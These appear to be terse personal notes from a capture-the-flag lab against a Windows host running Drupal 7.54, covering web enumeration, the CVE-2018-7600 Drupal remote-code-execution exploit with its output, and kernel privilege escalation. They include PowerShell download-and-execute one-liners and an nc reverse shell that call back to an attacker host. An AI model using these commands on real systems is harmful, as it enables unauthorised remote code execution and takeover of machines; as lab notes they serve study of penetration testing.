to check 32 or 64

```PowerShell
wmic os get osarchitecture
Get-WmiObject Win32_OperatingSystem | Select-Object OSArchitecture
```

```Bash
whatwed 10.129.211.253.    
// find robots.txt
// FIND Drupal version 
// in MacOs, fn+delete delete backward

// use another one for dir buster
ferobuster
// use a dictionary for api rest endpoints in web side
/usr/share/seclists/Discovery/Web-Content/api-endpoints-res.txt
```

```Bash
ruby 44449.rb
gem install highline // if needed
```

```Bash
systeminfo // in windows
dir c:\users
//use Nishang
ls -liah Shells
powershell iex(new-object system.net.webclient).downloadstring('http://10.10.14.9/Invoke-PowerShellTcp.ps1')
```

```Bash
sudo php -S 0:80 //it use php build a server at 80
```

```Bash
sudo python /usr/share/doc/python3-impacket/examples/smbserver.py share . 
//Building a local smb share 
```

```Bash
since Hotfix is N/A, so kernel privilege escalation 
systeminfo 
```

```Bash
powershell iex(new-object system.net.webclient).downloadstring('http://10.10.14.9/Invoke-PowerShellTcp.ps1')
```

```Bash
PS C:\inetpub\drupal-7.54> \\10.10.14.9\share\x64.exe "whoami" 
//returen : nt authority\system 
means use system account to performance  x64.ex command whoami
```

```Bash
\\10.10.14.9\share\x64.exe "\\10.10.14.9\share\nc64.exe -e cmd.exe 10.10.14.9 4444"
```

```PowerShell
python drupa7-CVE-2018-7600.py  -c  "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.9/Invoke-PowerShellTcp.ps1') " http://10.10.10.9
```

```PowerShell

➜  python drupa7-CVE-2018-7600.py -c "C:\Windows\System32\cmd.exe /c where powershell" http://10.10.10.9


=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-zFAdqXujZWTS2FxzuNeBxqZfNZXjCw2XwMsmJDFveE4
[*] Triggering exploit to execute: C:\Windows\System32\cmd.exe /c where powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

to find where is powershell, use

```PowerShell
where powershell
where pwsh
```